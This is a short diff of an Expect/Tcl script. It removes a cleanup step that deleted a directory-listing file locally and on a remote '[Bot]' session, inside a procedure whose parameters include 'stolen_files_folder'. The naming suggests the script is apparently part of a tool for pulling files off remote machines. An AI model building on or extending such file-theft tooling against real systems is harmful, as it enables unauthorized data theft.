@@ -98,17 +98,7 @@ proc traverse {dir stolen_files_folder config_folder_remote config_folder_local}
 		set file [open $ls_result_local]
 		set output [read $file]
 
-		# cleanup files after having read data into memory
-		file delete $ls_result_local
-		send "rm $ls_result_remote\r"    
-		expect {
-			-re {\[Bot.+\]} {
-				puts "ls file removed\n"
-			}
-			timeout {
-				puts "\r Timeout occurred\n"
-			}
-		}
+		
 
 	# Parse each line
 	set lines [split $output "\n"]
